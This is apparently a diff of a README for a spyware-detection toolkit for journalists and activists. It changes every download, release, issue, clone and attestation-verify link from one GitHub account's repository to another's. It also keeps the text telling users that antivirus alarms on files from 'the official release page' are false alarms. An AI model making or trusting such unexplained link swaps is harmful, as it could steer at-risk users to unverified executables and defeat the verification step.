@@ -3,7 +3,7 @@
 > **Version 3 is out:** besides looking for known spyware, it now shows the ways in left open on your devices,
 > checks the links, emails, files and QR codes people send you, and walks you through your accounts and home
 > network. A double-click app for Windows, Mac and Linux, in 27 languages.
-> [Download it from the latest release](https://github.com/interplains/ShadowTrace-Toolkit/releases/latest).
+> [Download it from the latest release](https://github.com/manilreddy1/ShadowTrace/releases/latest).
 
 > **Your antivirus may delete the program without asking.** Microsoft Defender and other antivirus
 > products sometimes wrongly remove new programs that are not code-signed yet. If the download vanishes,
@@ -22,7 +22,7 @@ Graphite, Candiru and others) on computers, Android phones and iPhone backups.
 - **States its limits.** Every report says what was found, how strong the evidence is, and
   what could not be checked. A clean result is never presented as proof that you are safe.
 
-Made by archivegenocide. Built on [ShadowTrace](https://github.com/interplains/shadowtrace).
+Made by archivegenocide. Built on [ShadowTrace](https://github.com/manilreddy1/ShadowTrace).
 
 > **If you think you are being targeted right now, get expert help first.** You do not
 > need to run this tool before asking. Journalists, activists, human-rights defenders and
@@ -50,7 +50,7 @@ This opens **ShadowTrace Web Hub** in your browser (`http://127.0.0.1:8772/`):
 ## Easiest: download the program (no Python, no commands)
 
 **You do not need to know anything technical to use this.** Download one file from the
-[latest release](https://github.com/interplains/ShadowTrace-Toolkit/releases/latest), open it,
+[latest release](https://github.com/manilreddy1/ShadowTrace/releases/latest), open it,
 and follow the window. You do not need the source code on this page, and you do not need to
 type any commands.
 
@@ -69,7 +69,7 @@ traces it looks for, in the places it could read. It cannot find spyware nobody 
 traces of, and it does not prove a device is safe. If you think you are being targeted, ask a
 digital-security helpline even if the result is green.
 
-**Your antivirus may flag or delete these programs.** It is a false alarm if the file came from [the official release page](https://github.com/interplains/ShadowTrace-Toolkit/releases/latest); see [If your antivirus removes it](#if-your-antivirus-removes-it). **If the file came from anywhere else, do not run it and trust the warning.**
+**Your antivirus may flag or delete these programs.** It is a false alarm if the file came from [the official release page](https://github.com/manilreddy1/ShadowTrace/releases/latest); see [If your antivirus removes it](#if-your-antivirus-removes-it). **If the file came from anywhere else, do not run it and trust the warning.**
 
 ### Windows
 
@@ -98,7 +98,7 @@ Open the app on the Mac itself, not through a remote or SSH session: it needs a 
 
 The warnings appear because the programs are not signed by Microsoft or Apple yet. Each
 program is built by GitHub from the published source, and you can check that before running it:
-`gh attestation verify <file> --repo interplains/ShadowTrace-Toolkit` (see
+`gh attestation verify <file> --repo manilreddy1/ShadowTrace` (see
 [docs/VERIFYING.md](docs/VERIFYING.md)). Prefer to see exactly what runs? Use the Python
 version in the guide below; it is the same check.
 
@@ -109,7 +109,7 @@ version) **Full Disk Access** in System Settings → Privacy & Security.
 
 New programs that are not code-signed yet are often flagged by mistake, and some antivirus products
 delete them straight away without asking. If you downloaded the program from
-[the official release page](https://github.com/interplains/ShadowTrace-Toolkit/releases/latest), it is a false alarm: the code is public and each program has a
+[the official release page](https://github.com/manilreddy1/ShadowTrace/releases/latest), it is a false alarm: the code is public and each program has a
 public build record. We report these false alarms to the antivirus companies, and code signing, which
 should stop most of them, is on its way.
 
@@ -340,7 +340,7 @@ up to a computer and the backup is checked there.
 | iPhone: "wrong password" | Use the password chosen when **Encrypt local backup** was first turned on. If it is forgotten, it can be reset on the iPhone (Settings → General → Transfer or Reset iPhone → Reset → Reset All Settings), then make a new backup. |
 | Safari "could not be checked" on a Mac | Give Terminal Full Disk Access (Mac step 3), close Terminal, open it again and run the check again. |
 
-Still stuck? Ask in the [issues](https://github.com/interplains/ShadowTrace-Toolkit/issues)
+Still stuck? Ask in the [issues](https://github.com/manilreddy1/ShadowTrace/issues)
 (do not post your report there; it contains private details).
 
 ### What the result means
@@ -958,7 +958,7 @@ packages. On macOS and Linux type `python3` instead of `python`.
 
 1. **Get the toolkit.** On GitHub choose **Code → Download ZIP** and extract it, or:
    ```
-   git clone https://github.com/interplains/ShadowTrace-Toolkit.git
+   git clone https://github.com/manilreddy1/ShadowTrace.git
    ```
 2. **Open a terminal in the toolkit folder.** Windows: open the extracted
    folder (`ShadowTrace-Toolkit`, or `ShadowTrace-Toolkit-main` from a ZIP), click the address bar, type `powershell` and press
